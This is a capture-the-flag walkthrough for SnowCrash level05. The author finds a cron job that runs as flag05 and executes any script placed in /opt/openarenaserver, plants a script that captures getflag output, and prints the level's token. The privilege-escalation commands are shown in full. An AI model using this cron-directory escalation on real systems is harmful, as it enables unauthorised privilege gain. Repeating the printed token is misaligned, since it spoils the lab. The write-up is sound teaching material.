after SSH'ing to the server we notice the following message
```shell
You have new mail.
level05@SnowCrash:~$
```

this indicates that we have new mail at `/var/mail`
```shell
level05@SnowCrash:~$ ls -la /var/mail
-rw-r--r--+ 1 root mail  58 Apr 19 21:15 level05
```

let's check out what we got
```shell
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

looks like a [crontab](https://en.wikipedia.org/wiki/Cron) configuration, it implies that every 2 minuets the script `/usr/sbin/openarenaserver` runs as the `flag05` user

let's check out the content of `/usr/sbin/openarenaserver`

```shell
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
looks like it executes all the scripts in `/opt/openarenaserver` directory with a time limit of 5 seconds then it deletes the file

we can exploit this behavior using the following command
```shell
level05@SnowCrash:~$ echo "getflag > /tmp/exploit" > /opt/openarenaserver/exploit.sh
```

now all we have to do is wait for the 2 minute mark to pass
```shell
level05@SnowCrash:~$ cat /tmp/exploit
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

on to the next level
